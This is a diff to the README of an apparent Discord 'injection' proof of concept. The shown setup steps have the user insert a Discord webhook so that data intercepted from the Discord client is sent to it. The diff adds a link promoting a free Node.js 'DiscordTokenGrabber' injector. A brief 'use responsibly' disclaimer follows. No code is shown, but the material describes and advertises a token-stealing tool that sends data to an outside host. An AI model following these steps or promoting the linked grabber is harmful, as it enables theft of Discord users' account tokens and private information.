@@ -24,4 +24,8 @@ Discord Injection is a demonstration of intercepting various HTTP requests withi
 3. Replace `%WEBHOOK%` with your Discord webhook. The intercepted information will be sent to this webhook.
 4. Restart Discord
 
-Note: Use this PoC responsibly and only on applications and systems you have explicit permission to test. Unauthorized use may violate terms of service and legal agreements.
+# Mode
+- If you want to use the **injector** based on Nodejs and with many features, enter [here](https://github.com/k4itrun/DiscordTokenGrabber) it is free
+
+### Note
+Use this PoC responsibly and only on applications and systems you have explicit permission to test. Unauthorized use may violate terms of service and legal agreements.
